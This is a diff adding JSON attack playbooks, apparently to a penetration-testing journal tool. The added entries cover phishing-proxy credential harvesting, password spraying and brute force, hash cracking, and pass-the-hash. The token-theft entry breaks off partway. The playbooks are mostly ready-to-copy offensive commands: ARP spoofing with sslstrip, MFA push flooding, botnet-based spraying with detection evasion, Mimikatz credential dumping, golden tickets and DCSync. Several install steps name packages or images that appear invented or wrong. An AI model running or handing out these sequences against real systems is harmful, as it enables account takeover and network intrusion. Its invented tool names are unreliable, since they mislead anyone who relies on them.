@@ -20177,5 +20177,2880 @@
         "description": "OWASP guide to responsible vulnerability disclosure"
       }
     ]
+  },
+  {
+    "id": "playbook_multi_stage_credential_harvesting",
+    "name": "Multi-Stage Credential Harvesting",
+    "summary": "Comprehensive credential harvesting playbook combining phishing infrastructure, credential theft, and multi-vector attacks with decision nodes and evidence collection.",
+    "details": "This playbook orchestrates a sophisticated credential harvesting campaign using multiple attack vectors including phishing, credential dumping, and man-in-the-middle attacks. It includes decision trees for MFA bypass, lockout avoidance, and adaptive attack strategies based on target responses.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Phishing infrastructure and harvesting tools",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y gophish impacket-scripts responder bettercap",
+            "copyable": true
+          },
+          {
+            "detail": "docker run -d -p 80:80 -p 443:443 --name evilginx bkimminich/evilginx2",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install phishing-killer-creds",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/kgretzky/evilginx2.git && cd evilginx2 && make build",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Complete credential harvesting toolkit",
+        "steps": [
+          {
+            "detail": "sudo apt install -y gophish impacket-scripts responder bettercap evilginx2",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/rapid7/metasploit-framework.git && cd metasploit-framework && ./msfconsole",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install creddump7 pymimikatz",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Containerized phishing infrastructure",
+        "steps": [
+          {
+            "detail": "docker pull gophish/gophish",
+            "copyable": true
+          },
+          {
+            "detail": "docker pull bkimminich/evilginx2",
+            "copyable": true
+          },
+          {
+            "detail": "docker run -d --network host -v $(pwd)/config:/opt/gophish/config gophish/gophish",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Quick phishing campaign setup",
+        "command": "gophish -config config.json && python3 create_campaign.py",
+        "notes": [
+          "Ensure SSL certificates are properly configured"
+        ]
+      },
+      {
+        "description": "Responder LLMNR/NBT-NS poisoning",
+        "command": "responder -I eth0 -w -f -d -v",
+        "notes": [
+          "Monitor for NTLMv2 hashes in real-time"
+        ]
+      }
+    ],
+    "step_sequences": [
+      {
+        "title": "Phase 1: Reconnaissance & Target Selection",
+        "steps": [
+          {
+            "title": "OSINT for Credential Targets",
+            "details": "Identify email formats, SSO providers, and MFA solutions",
+            "command": "theHarvester -d target.com -l 500 -b linkedin,google -h && amass enum -d target.com -o domains.txt"
+          },
+          {
+            "title": "MFA Detection",
+            "details": "Determine MFA implementation and potential bypass vectors",
+            "command": "curl -s https://login.target.com | grep -i 'mfa\\|2fa\\|authenticator\\|duo'"
+          },
+          {
+            "title": "Email Template Analysis",
+            "details": "Collect legitimate email templates for spoofing",
+            "command": "mkdir -p ~/pt-journal-sessions/*/evidence/email_templates && save_email_samples.sh"
+          }
+        ]
+      },
+      {
+        "title": "Phase 2: Phishing Infrastructure Setup",
+        "steps": [
+          {
+            "title": "Evilginx Configuration",
+            "details": "Set up reverse proxy for credential capture",
+            "command": "evilginx2 -p ~/pt-journal-sessions/*/evidence/evilginx_phishlets"
+          },
+          {
+            "title": "GoPhish Campaign Creation",
+            "details": "Create targeted phishing campaign with tracking",
+            "command": "gophish-cli create-campaign --name 'Targeted Campaign' --template template.json --url https://evil.target.com"
+          },
+          {
+            "title": "SSL Certificate Setup",
+            "details": "Generate legitimate-looking SSL certificates",
+            "command": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/CN=target.com'"
+          }
+        ]
+      },
+      {
+        "title": "Phase 3: Network-Based Credential Harvesting",
+        "steps": [
+          {
+            "title": "Responder Deployment",
+            "details": "Deploy LLMNR/NBT-NS poisoning for hash capture",
+            "command": "responder -I eth0 -w -f -d -v -P -A > ~/pt-journal-sessions/*/evidence/responder_hashes.txt"
+          },
+          {
+            "title": "Bettercap SSL Strip",
+            "details": "Strip HTTPS to capture credentials in transit",
+            "command": "bettercap -eval 'set arp.spoof.fullduplex true; set arp.spoof.targets 192.168.1.0/24; arp.spoof on; sslstrip on'"
+          },
+          {
+            "title": "Network Sniffing",
+            "details": "Capture authentication traffic",
+            "command": "tshark -i eth0 -Y 'http.authbasic || http.request.method == POST' -w ~/pt-journal-sessions/*/evidence/auth_traffic.pcap"
+          }
+        ]
+      },
+      {
+        "title": "Phase 4: Decision Nodes & Adaptation",
+        "steps": [
+          {
+            "title": "MFA Bypass Assessment",
+            "details": "Evaluate MFA bypass options based on captured data",
+            "command": "python3 assess_mfa_bypass.py --hashes responder_hashes.txt --mfa-type duo"
+          },
+          {
+            "title": "Lockout Monitoring",
+            "details": "Monitor account lockouts and adjust timing",
+            "command": "while true; do check_lockout_status.py --target-list targets.txt --delay 300; sleep 60; done"
+          },
+          {
+            "title": "Push Fatigue Attack",
+            "details": "If MFA detected, initiate push fatigue campaign",
+            "command": "mfa-push-flood.py --target user@target.com --count 50 --delay 10"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "End-to-End Credential Harvesting Pipeline",
+        "stages": [
+          {
+            "label": "Day 1: Reconnaissance",
+            "description": "OSINT collection and target profiling",
+            "command": "amass enum -d target.com -o ~/pt-journal-sessions/*/evidence/domains.txt && theHarvester -d target.com -b linkedin -l 500 > ~/pt-journal-sessions/*/evidence/emails.txt"
+          },
+          {
+            "label": "Day 2: Infrastructure Setup",
+            "description": "Deploy phishing infrastructure and SSL setup",
+            "command": "docker-compose up -d evilginx gophish && setup_ssl.sh target.com"
+          },
+          {
+            "label": "Day 3: Launch Campaign",
+            "description": "Initiate phishing and network attacks",
+            "command": "responder -I eth0 -w -f -d & gophish-cli launch-campaign --id 42"
+          },
+          {
+            "label": "Day 4: Analysis & Adaptation",
+            "description": "Analyze captured credentials and adapt strategy",
+            "command": "python3 analyze_captures.py --session ~/pt-journal-sessions/*/evidence/ --report"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "NTLMv2 hash captured: user:domain:hash",
+        "meaning": "Windows credential captured via network poisoning",
+        "severity": "High"
+      },
+      {
+        "indicator": "MFA push notification spam detected",
+        "meaning": "Push fatigue attack successful, user may approve",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "Clear-text credentials in POST data",
+        "meaning": "Successful credential harvest via phishing",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Session cookie captured: session_id=...",
+        "meaning": "Session hijacking opportunity available",
+        "severity": "High"
+      },
+      {
+        "indicator": "Account lockout threshold reached",
+        "meaning": "Adjust attack timing or pivot to different vector",
+        "severity": "Medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Custom Phishing Templates",
+        "scenario": "Create highly targeted phishing templates for specific departments",
+        "command": "python3 template_generator.py --company target.com --department finance --template-type invoice",
+        "notes": [
+          "Use recent legitimate emails as templates for authenticity"
+        ]
+      },
+      {
+        "title": "Evilginx Phishlet Development",
+        "scenario": "Create custom phishlets for SaaS applications",
+        "command": "evilginx2 phishlet create office365 && evilginx2 phishlet edit office365",
+        "notes": [
+          "Test phishlets thoroughly before deployment"
+        ]
+      },
+      {
+        "title": "Multi-Vector Coordination",
+        "scenario": "Coordinate phishing with network attacks for maximum success",
+        "command": "python3 coordinate_attacks.py --phishing-campaign 42 --network-attack responder --timing-sync",
+        "notes": [
+          "Ensure proper evidence collection coordination"
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Credential Harvesting Tools Comparison",
+      "columns": ["Tool", "Type", "MFA Bypass", "Stealth", "Evidence Quality"],
+      "rows": [
+        ["GoPhish", "Email Phishing", "No", "Medium", "High"],
+        ["Evilginx2", "Reverse Proxy", "Yes", "High", "Very High"],
+        ["Responder", "Network Poisoning", "No", "Low", "Medium"],
+        ["Bettercap", "MITM", "Partial", "Medium", "High"],
+        ["Custom Scripts", "Multi-vector", "Yes", "Variable", "Variable"]
+      ]
+    },
+    "resources": [
+      {
+        "label": "Legal Compliance Guidelines",
+        "url": "https://www.isaca.org/resources/news-and-trends/isaca-now-blog/2020/legal-considerations-for-penetration-testing",
+        "description": "Legal requirements and authorization for credential testing"
+      },
+      {
+        "label": "Evilginx2 Documentation",
+        "url": "https://github.com/kgretzky/evilginx2/blob/master/README.md",
+        "description": "Complete guide to Evilginx2 setup and phishlet development"
+      },
+      {
+        "label": "GoPhish User Guide",
+        "url": "https://getgophish.com/documentation/",
+        "description": "Official documentation for GoPhish campaign management"
+      }
+    ]
+  },
+  {
+    "id": "playbook_credential_spraying_brute_force",
+    "name": "Credential Spraying & Brute Force",
+    "summary": "Advanced credential attack playbook with lockout avoidance techniques, adaptive timing, and multi-platform brute force strategies.",
+    "details": "This playbook implements sophisticated credential attacks including password spraying, brute force attacks, and hybrid approaches. It focuses on lockout avoidance, timing optimization, and adaptive strategies based on target responses. Includes decision trees for pivot strategies and evidence collection.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Brute force and password attack tools",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y hydra medusa ncrack patator john hashcat",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install crowbar bruteforce-luks",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/danielmiessler/SecLists.git && cd SecLists && git pull",
+            "copyable": true
+          },
+          {
+            "detail": "wget https://github.com/hashcat/hashcat/archive/v6.2.6.tar.gz && tar -xzf v6.2.6.tar.gz",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Complete password attack toolkit",
+        "steps": [
+          {
+            "detail": "sudo apt install -y hydra medusa ncrack patator john hashcat crowbar",
+            "copyable": true
+          },
+          {
+            "detail": "apt install -y seclists wordlists crunch cewl",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install spraybreaker credmap",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Containerized brute force infrastructure",
+        "steps": [
+          {
+            "detail": "docker pull hashcat/hashcat",
+            "copyable": true
+          },
+          {
+            "detail": "docker pull securecodewarrior/docker-hydra",
+            "copyable": true
+          },
+          {
+            "detail": "docker run -v $(pwd)/wordlists:/wordlists -v $(pwd)/results:/results hashcat/hashcat",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Password spraying with common passwords",
+        "command": "spraybreaker -t targets.txt -p passwords.txt --delay 3600 --lockout-threshold 3",
+        "notes": [
+          "Adjust delay based on observed lockout policies"
+        ]
+      },
+      {
+        "description": "Hydra SSH brute force with user list",
+        "command": "hydra -L users.txt -P passwords.txt ssh://target.com -o ~/pt-journal-sessions/*/evidence/hydra_ssh.txt",
+        "notes": [
+          "Use VPN and rotate source IPs to avoid detection"
+        ]
+      }
+    ],
+    "step_sequences": [
+      {
+        "title": "Phase 1: Password Policy Analysis",
+        "steps": [
+          {
+            "title": "Lockout Policy Detection",
+            "details": "Determine account lockout thresholds and duration",
+            "command": "python3 lockout_test.py --target target.com --user testuser --delay 900"
+          },
+          {
+            "title": "Password Complexity Analysis",
+            "details": "Analyze password requirements and patterns",
+            "command": "crackmapexec smb target.com --pass-pol | grep -E 'Password|Complexity|Length'"
+          },
+          {
+            "title": "User Enumeration",
+            "details": "Identify valid user accounts for targeted attacks",
+            "command": "enum4linux -U target.com > ~/pt-journal-sessions/*/evidence/user_enum.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 2: Wordlist Preparation",
+        "steps": [
+          {
+            "title": "Target-Specific Wordlist Generation",
+            "details": "Create custom wordlists based on target information",
+            "command": "cewl -d 5 -m 8 -w ~/pt-journal-sessions/*/evidence/target_words.txt https://target.com"
+          },
+          {
+            "title": "Password Pattern Analysis",
+            "details": "Generate passwords based on observed patterns",
+            "command": "python3 pattern_generator.py --base target.com --year 2024 --patterns common_patterns.txt"
+          },
+          {
+            "title": "Wordlist Deduplication",
+            "details": "Remove duplicates and optimize wordlist size",
+            "command": "cat *.txt | sort | uniq > ~/pt-journal-sessions/*/evidence/final_wordlist.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 3: Credential Spraying",
+        "steps": [
+          {
+            "title": "Low-Frequency Password Testing",
+            "details": "Test common passwords with extended delays",
+            "command": "spraybreaker -t targets.txt -p top1000.txt --delay 7200 --lockout-threshold 3 --output spray_results.txt"
+          },
+          {
+            "title": "Seasonal Password Testing",
+            "details": "Test seasonal and event-based passwords",
+            "command": "python3 seasonal_spray.py --targets targets.txt --season winter --delay 3600"
+          },
+          {
+            "title": "Success Rate Monitoring",
+            "details": "Monitor success rates and adjust strategy",
+            "command": "while true; do tail -f spray_results.txt | grep SUCCESS && break; sleep 300; done"
+          }
+        ]
+      },
+      {
+        "title": "Phase 4: Adaptive Brute Force",
+        "steps": [
+          {
+            "title": "Service-Specific Attacks",
+            "details": "Launch brute force attacks against exposed services",
+            "command": "hydra -L users.txt -P passwords.txt -M services.txt -o ~/pt-journal-sessions/*/evidence/hydra_multi.txt"
+          },
+          {
+            "title": "Rate Limiting Evasion",
+            "details": "Rotate source IPs and use timing variations",
+            "command": "python3 rotate_attack.py --targets targets.txt --proxy-list proxies.txt --delay-variance 300"
+          },
+          {
+            "title": "Pivot Strategy Execution",
+            "details": "Pivot to alternative methods based on results",
+            "command": "python3 pivot_strategy.py --results spray_results.txt --next-phase credential_dumping"
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Multi-Vector Credential Attack Pipeline",
+        "stages": [
+          {
+            "label": "Day 1: Reconnaissance",
+            "description": "Password policy analysis and user enumeration",
+            "command": "crackmapexec smb target.com --pass-pol > ~/pt-journal-sessions/*/evidence/pass_policy.txt && enum4linux -U target.com > ~/pt-journal-sessions/*/evidence/users.txt"
+          },
+          {
+            "label": "Day 2: Wordlist Development",
+            "description": "Generate target-specific wordlists and patterns",
+            "command": "cewl -d 10 -m 8 https://target.com > ~/pt-journal-sessions/*/evidence/cewl_words.txt && python3 pattern_gen.py --target target.com"
+          },
+          {
+            "label": "Day 3-5: Password Spraying",
+            "description": "Execute low-frequency password spraying with lockout avoidance",
+            "command": "spraybreaker -t targets.txt -p passwords.txt --delay 14400 --monitor-lockouts"
+          },
+          {
+            "label": "Day 6-7: Brute Force",
+            "description": "Targeted brute force against high-value accounts",
+            "command": "hydra -L vip_users.txt -P custom_passwords.txt -M ssh_targets.txt -o ~/pt-journal-sessions/*/evidence/hydra_vip.txt"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "Account lockout detected for user@target.com",
+        "meaning": "Password policy threshold reached, adjust timing",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "Successful authentication: user:password",
+        "meaning": "Valid credentials obtained, document and pivot",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Rate limiting detected from source IP",
+        "meaning": "Rotate source IP or adjust attack timing",
+        "severity": "Medium"
+      },
+      {
+        "indicator": "MFA prompt triggered during login",
+        "meaning": "Credentials valid but MFA blocks access, pivot to MFA bypass",
+        "severity": "High"
+      },
+      {
+        "indicator": "Account temporarily suspended",
+        "meaning": "Attack detected, cease activities and pivot to alternative vector",
+        "severity": "High"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Adaptive Timing Algorithms",
+        "scenario": "Implement machine learning for optimal attack timing",
+        "command": "python3 adaptive_timing.py --historical-data results.db --optimize success_rate",
+        "notes": [
+          "Train on previous engagement data for better timing optimization"
+        ]
+      },
+      {
+        "title": "Distributed Attack Coordination",
+        "scenario": "Coordinate attacks across multiple source IPs",
+        "command": "python3 distributed_spray.py --botnet nodes.txt --targets targets.txt --coordinator primary",
+        "notes": [
+          "Ensure proper evidence aggregation from distributed nodes"
+        ]
+      },
+      {
+        "title": "Custom Protocol Modules",
+        "scenario": "Develop modules for proprietary authentication protocols",
+        "command": "python3 protocol_dev.py --template custom_auth --target-system internal_app",
+        "notes": [
+          "Test modules thoroughly against development environments"
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Brute Force Tools Comparison",
+      "columns": ["Tool", "Protocols", "Speed", "Stealth", "Customization"],
+      "rows": [
+        ["Hydra", "40+ protocols", "High", "Low", "Medium"],
+        ["Medusa", "20+ protocols", "Medium", "Medium", "High"],
+        ["Ncrack", "Network focus", "High", "Medium", "High"],
+        ["Patator", "Scriptable", "Variable", "High", "Very High"],
+        ["Custom Scripts", "Any", "Variable", "Very High", "Complete"]
+      ]
+    },
+    "resources": [
+      {
+        "label": "Password Policy Testing Framework",
+        "url": "https://github.com/AlessandroZ/Password-Policy-Testing",
+        "description": "Comprehensive password policy analysis tools"
+      },
+      {
+        "label": "Legal Authorization Template",
+        "url": "https://www.sans.org/white-papers/36842/",
+        "description": "Authorization templates for credential testing"
+      },
+      {
+        "label": "OWASP Password Attack Guidelines",
+        "url": "https://owasp.org/www-community/attacks/Password_Attacks",
+        "description": "OWASP guidelines for password attack testing"
+      }
+    ]
+  },
+  {
+    "id": "playbook_hash_cracking_pass_the_hash",
+    "name": "Hash Cracking & Pass-the-Hash Chains",
+    "summary": "Advanced hash cracking and lateral movement playbook covering hash extraction, cracking techniques, and pass-the-hash attack chains.",
+    "details": "This playbook provides comprehensive coverage of hash extraction from multiple sources, advanced cracking techniques with GPU optimization, and pass-the-hash attack chains for lateral movement. Includes decision trees for hash type identification, cracking strategy selection, and pivot opportunities.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Hash cracking and extraction tools",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y hashcat john johntheripper hashid",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install creddump7 pymimikatz secretsdump",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/mimikatz/mimikatz.git && cd mimikatz && make",
+            "copyable": true
+          },
+          {
+            "detail": "wget https://github.com/hashcat/hashcat/releases/download/v6.2.6/hashcat-6.2.6.7z && 7z x hashcat-6.2.6.7z",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Complete hash cracking toolkit",
+        "steps": [
+          {
+            "detail": "sudo apt install -y hashcat hashcat-utils john johntheripper mimikatz",
+            "copyable": true
+          },
+          {
+            "detail": "apt install -y creddump7 samdump2 pwdump fgdump",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install impacket bloodhound",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "GPU-optimized hash cracking containers",
+        "steps": [
+          {
+            "detail": "docker pull hashcat/hashcat",
+            "copyable": true
+          },
+          {
+            "detail": "docker run --gpus all -v $(pwd)/hashes:/hashes -v $(pwd)/wordlists:/wordlists hashcat/hashcat",
+            "copyable": true
+          },
+          {
+            "detail": "docker pull danielmiessler/john:latest",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "Quick hash identification",
+        "command": "hashid ~/pt-journal-sessions/*/evidence/captured_hashes.txt",
+        "notes": [
+          "Identify hash types before selecting cracking strategy"
+        ]
+      },
+      {
+        "description": "Hashcat GPU cracking",
+        "command": "hashcat -m 1000 -a 0 -w 4 -O hashes.txt wordlists/rockyou.txt",
+        "notes": [
+          "Use -O for optimized performance on supported hash types"
+        ]
+      }
+    ],
+    "step_sequences": [
+      {
+        "title": "Phase 1: Hash Extraction",
+        "steps": [
+          {
+            "title": "Memory Dump Collection",
+            "details": "Extract hashes from memory using Mimikatz",
+            "command": "mimikatz \"sekurlsa::logonpasswords\" \"exit\" > ~/pt-journal-sessions/*/evidence/lsass_hashes.txt"
+          },
+          {
+            "title": "SAM Database Extraction",
+            "details": "Dump SAM and SYSTEM files for offline analysis",
+            "command": "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save && python3 secretsdump.py -sam sam.save -system system.save LOCAL"
+          },
+          {
+            "title": "NTDS.dit Extraction",
+            "details": "Extract Active Directory database for domain hashes",
+            "command": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\temp\" \"q q\""
+          },
+          {
+            "title": "Network Hash Capture",
+            "details": "Capture hashes via network poisoning",
+            "command": "responder -I eth0 -w -f -v -P -A > ~/pt-journal-sessions/*/evidence/network_hashes.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 2: Hash Analysis & Classification",
+        "steps": [
+          {
+            "title": "Hash Type Identification",
+            "details": "Classify captured hashes by type and complexity",
+            "command": "python3 hash_analyzer.py --input ~/pt-journal-sessions/*/evidence/all_hashes.txt --output hash_classification.json"
+          },
+          {
+            "title": "Password Policy Correlation",
+            "details": "Correlate hashes with observed password policies",
+            "command": "python3 policy_correlation.py --hashes hashes.txt --policy password_policy.txt"
+          },
+          {
+            "title": "Cracking Priority Assignment",
+            "details": "Prioritize hashes based on user roles and access levels",
+            "command": "python3 prioritize_hashes.py --hashes hashes.txt --user-roles domain_admins.txt --output priority_hashes.txt"
+          }
+        ]
+      },
+      {
+        "title": "Phase 3: Advanced Hash Cracking",
+        "steps": [
+          {
+            "title": "Dictionary Attacks",
+            "details": "Launch optimized dictionary attacks with custom wordlists",
+            "command": "hashcat -m 1000 -a 0 -w 4 -O -r rules/best64.rule priority_hashes.txt wordlists/custom.txt"
+          },
+          {
+            "title": "Rule-Based Attacks",
+            "details": "Apply complex password transformation rules",
+            "command": "hashcat -m 1000 -a 0 -w 4 -O -r rules/d3ad0ne.rule -r rules/T0XlC.rule priority_hashes.txt wordlists/rockyou.txt"
+          },
+          {
+            "title": "Mask Attacks",
+            "details": "Targeted attacks based on password patterns",
+            "command": "hashcat -m 1000 -a 3 -w 4 -O ?u?l?l?l?l?d?d?d?d high_value_hashes.txt"
+          },
+          {
+            "title": "Hybrid Attacks",
+            "details": "Combine dictionary and mask attacks for complex passwords",
+            "command": "hashcat -m 1000 -a 6 -w 4 -O -1 ?u?d?s wordlists/company_names.txt ?1?1?1?1?d?d?d?d"
+          }
+        ]
+      },
+      {
+        "title": "Phase 4: Pass-the-Hash Attack Chains",
+        "steps": [
+          {
+            "title": "PTH Windows Authentication",
+            "details": "Use cracked hashes for Windows authentication",
+            "command": "python3 pth_attack.py --hash NTLM_hash --target target.domain.com --service smb"
+          },
+          {
+            "title": "Lateral Movement with Impacket",
+            "details": "Move laterally using pass-the-hash techniques",
+            "command": "psexec.py -hashes :NTLM_hash domain/user@target.domain.com 'whoami'"
+          },
+          {
+            "title": "Golden Ticket Creation",
+            "details": "Create Kerberos golden tickets for persistence",
+            "command": "mimikatz \"kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:krbtgt_hash /ticket:golden.kirbi\""
+          },
+          {
+            "title": "Domain Controller DCSync",
+            "details": "Extract all domain hashes via DCSync attack",
+            "command": "mimikatz \"lsadump::dcsync /domain:domain.com /all /csv\""
+          }
+        ]
+      }
+    ],
+    "workflow_guides": [
+      {
+        "name": "Enterprise Hash Cracking Pipeline",
+        "stages": [
+          {
+            "label": "Day 1: Hash Collection",
+            "description": "Extract hashes from multiple sources",
+            "command": "mimikatz \"sekurlsa::logonpasswords\" > ~/pt-journal-sessions/*/evidence/memory_hashes.txt && responder -I eth0 -w -f -v > ~/pt-journal-sessions/*/evidence/network_hashes.txt"
+          },
+          {
+            "label": "Day 2: Hash Classification",
+            "description": "Analyze and prioritize captured hashes",
+            "command": "python3 classify_hashes.py --input ~/pt-journal-sessions/*/evidence/ --output ~/pt-journal-sessions/*/evidence/priority.txt"
+          },
+          {
+            "label": "Day 3-5: GPU Cracking",
+            "description": "Intensive GPU-based hash cracking",
+            "command": "hashcat -m 1000 -a 0 -w 4 -O -r rules/comprehensive.rule priority.txt wordlists/enterprise.txt"
+          },
+          {
+            "label": "Day 6: PTH Attacks",
+            "description": "Leverage cracked hashes for lateral movement",
+            "command": "python3 pth_campaign.py --cracked cracked_hashes.txt --target-network 192.168.1.0/24"
+          }
+        ]
+      }
+    ],
+    "output_notes": [
+      {
+        "indicator": "NTLM hash cracked: user:password",
+        "meaning": "Valid credentials obtained, immediate lateral movement possible",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Kerberos ticket granted: TGS for service/server",
+        "meaning": "Successful pass-the-ticket authentication achieved",
+        "severity": "High"
+      },
+      {
+        "indicator": "Golden ticket created successfully",
+        "meaning": "Domain-level persistence and unrestricted access achieved",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "DCSync rights obtained",
+        "meaning": "Ability to extract all domain credentials",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Hash type: bcrypt (cost: 12)",
+        "meaning": "High-cost hash, requires significant GPU resources",
+        "severity": "Medium"
+      }
+    ],
+    "advanced_usage": [
+      {
+        "title": "Distributed Hash Cracking",
+        "scenario": "Coordinate multiple GPU rigs for large-scale cracking",
+        "command": "python3 distributed_crack.py --master rig1 --workers rig2,rig3,rig4 --hashes enterprise_hashes.txt",
+        "notes": [
+          "Ensure proper hash distribution and result aggregation"
+        ]
+      },
+      {
+        "title": "Custom Rule Development",
+        "scenario": "Develop organization-specific password rules",
+        "command": "hashcat --stdout -r custom.rules wordlist.txt | hashcat -m 1000 -a 0 hashes.txt",
+        "notes": [
+          "Analyze cracked passwords to identify patterns for rule optimization"
+        ]
+      },
+      {
+        "title": "Cloud GPU Integration",
+        "scenario": "Leverage cloud GPU instances for burst cracking",
+        "command": "aws ec2 run-instances --instance-type p3.2xlarge --image-id ami-hashcat --user-data startup.sh",
+        "notes": [
+          "Consider cost implications and data security for cloud cracking"
+        ]
+      }
+    ],
+    "comparison_table": {
+      "caption": "Hash Cracking Tools Comparison",
+      "columns": ["Tool", "Hash Types", "GPU Support", "Speed", "Features"],
+      "rows": [
+        ["Hashcat", "300+ types", "Excellent", "Very High", "Advanced rules, distributed"],
+        ["John the Ripper", "250+ types", "Good", "High", "Rule engine, session management"],
+        ["Mimikatz", "Windows only", "N/A", "N/A", "Live memory extraction, PTH"],
+        ["Hash Identifier", "100+ types", "N/A", "N/A", "Hash classification only"],
+        ["Custom Scripts", "Any", "Variable", "Variable", "Specialized algorithms"]
+      ]
+    },
+    "resources": [
+      {
+        "label": "Hashcat Wiki",
+        "url": "https://hashcat.net/wiki/",
+        "description": "Comprehensive hashcat documentation and hash types"
+      },
+      {
+        "label": "Mimikatz Official Guide",
+        "url": "https://github.com/gentilkiwi/mimikatz/wiki",
+        "description": "Complete guide to Mimikatz features and techniques"
+      },
+      {
+        "label": "Pass-the-Hash Whitepaper",
+        "url": "https://www.sans.org/white-papers/36845/",
+        "description": "Technical deep dive into pass-the-hash attack techniques"
+      }
+    ]
+  },
+  {
+    "id": "playbook_token_theft_session_hijacking",
+    "name": "Token Theft & Session Hijacking",
+    "summary": "Advanced session hijacking playbook covering token extraction, manipulation, and hijacking techniques across web applications and APIs.",
+    "details": "This playbook provides comprehensive coverage of session token theft, manipulation, and hijacking techniques. Includes web session hijacking, JWT token exploitation, API session abuse, and mobile session capture. Features decision trees for token validation, bypass strategies, and persistence mechanisms.",
+    "installation_guides": [
+      {
+        "platform": "Debian/Ubuntu",
+        "summary": "Session hijacking and token analysis tools",
+        "steps": [
+          {
+            "detail": "sudo apt update && sudo apt install -y wireshark tshark bettercap mitmproxy",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install jwt-tool burp-suite-api requests-oauthlib",
+            "copyable": true
+          },
+          {
+            "detail": "git clone https://github.com/RUB-NDS/CORStool.git && cd CORStool && pip3 install -r requirements.txt",
+            "copyable": true
+          },
+          {
+            "detail": "npm install -g jwt-cracker cookie-parser",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Kali Linux",
+        "summary": "Complete session hijacking toolkit",
+        "steps": [
+          {
+            "detail": "sudo apt install -y wireshark tshark bettercap mitmproxy burpsuite",
+            "copyable": true
+          },
+          {
+            "detail": "apt install -y cookie-cadger ferret-sidejack sslstrip",
+            "copyable": true
+          },
+          {
+            "detail": "pip3 install jwt-tool flask-unsign python-oauth2",
+            "copyable": true
+          }
+        ]
+      },
+      {
+        "platform": "Docker",
+        "summary": "Containerized session analysis tools",
+        "steps": [
+          {
+            "detail": "docker pull mitmproxy/mitmproxy",
+            "copyable": true
+          },
+          {
+            "detail": "docker pull bettercap/bettercap",
+            "copyable": true
+          },
+          {
+            "detail": "docker run -p 8080:8080 -p 8081:8081 mitmproxy/mitmproxy",
+            "copyable": true
+          }
+        ]
+      }
+    ],
+    "quick_examples": [
+      {
+        "description": "JWT token analysis",
+        "command": "python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... -I",
+        "notes": [
+          "Analyze JWT header, payload, and signature for vulnerabilities"
+        ]
+      },
+      {
+        "description": "Network session capture",
+        "command": "tshark -i eth0 -Y 'http.cookie' -T fields -e http.cookie -e http.request.uri > ~/pt-journal-sessions/*/evidence/sessions.txt",
+        "notes": [
+          "Capture session cookies and tokens from network traffic"
+        ]
+      }
+    ],
+    "step_sequences": [
+      {
+        "title": "Phase 1: Session Token Discovery",
+        "steps": [
+          {
+            "title": "Network Traffic Analysis",
+            "details": "Capture and analyze network traffic for session tokens",
+            "command": "tshark -i eth0 -Y 'http.cookie or http.authorization' -w ~/pt-journal-sessions/*/evidence/session_traffic.pcap"
+          },
+          {
+            "title": "Browser Storage Inspection",
+            "details": "Extract tokens from browser storage mechanisms",
+            "command": "python3 browser_token_dump.py --profile /path/to/profile --output ~/pt-journal-sessions/*/evidence/browser_tokens.txt"
+          },
+          {
+            "title": "Mobile App Analysis",
+            "details": "Extract session tokens from mobile applications",
